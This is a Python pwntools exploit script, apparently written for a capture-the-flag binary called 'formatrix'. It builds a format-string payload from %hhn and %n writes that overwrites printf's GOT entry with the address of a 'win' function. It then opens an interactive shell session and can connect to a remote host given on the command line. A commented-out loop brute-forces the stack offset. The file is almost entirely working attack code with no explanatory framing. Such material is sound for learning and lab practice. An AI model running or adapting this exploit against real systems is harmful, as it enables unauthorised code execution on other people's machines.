from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "formatrix").resolve().__str__()
# b * printf + 166
# b *0x40131e
#
gdb_script = """
b *main+277
b *main+282
b *main+287
b *main+327
c
"""


frame_size = 0x600  # 544
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


# Get win_addr
elf = ELF("formatrix")
win_addr: int = elf.symbols["win"]
puts_addr: int = elf.got["printf"]
# puts_addr: int = elf.got["puts"]

print(f"The puts address is:{hex(puts_addr)}")
print(f"The win address is:{hex(win_addr)}")
print("____________________________________")
# The puts address is:0x403568
# The win address is:0x4011d6
# The printf address is:0x403580


# 0x40    11   d6
# 64      17   214
# next number that has 40 at the end that can be added to 0x11d6 is 0x1240

# Only lln works
# %214c%24$hhn%59c%25$hhn%47c%26$hhn\001\001\001\001\001\001h5@
# K is the offset
# k = 10
# k = 43?


def gen_payload(got_addr, k):

    fmt = b""
    fmt += f"%214c%{k}$hhn".encode()  # write 0xd6
    fmt += f"%{(256 - 0xd6)+0x11}c%{k+1}$hhn".encode()  # write 0x11
    fmt += f"%{(0x40 - 0x11)}c%{k+2}$n".encode()  # write the other 32bits 0x00000140
    # Now it is address at printf is: 0x0000014011d6
    # Now overwrite the next byte with 00!
    fmt += f"%{(256 - 0x40)}c%{k+3}$hhn".encode()
    # print(f"Format is: {fmt}")
    # print(f"Format len is: {len(fmt)}")
    payload = fmt.ljust(len(fmt) + (-len(fmt) % 8), b"\x01")
    payload = fmt
    payload += p64(got_addr)
    payload += p64(got_addr + 1)
    payload += p64(got_addr + 2)
    payload += p64(got_addr + 3)

    return payload


def run_pro(start, got_addr, gen_payload, x):
    io = start()
    res = io.recvuntil(delims=": ")
    print("____________________________________")
    print(res)

    payload = gen_payload(got_addr, x)
    # payload = 8 * b"A" + b"|" + b"".join(f"{i}: %p|".encode() for i in range(1, 30))

    print(f"Sending payload: {payload}")
    print(f"Payload size: {len(payload)}")
    io.sendline(payload)

    print("____________________________________")
    # res = io.recvlines(2)
    # print(res)
    io.interactive()


# brute force offset
# for x in range(5, 200):
#     try:
#         run_pro(start, puts_addr, gen_payload, x)
#     except Exception as err:
#         print(err)

run_pro(start, puts_addr, gen_payload, 133)
# io.sendline(b"A" * frame_size)
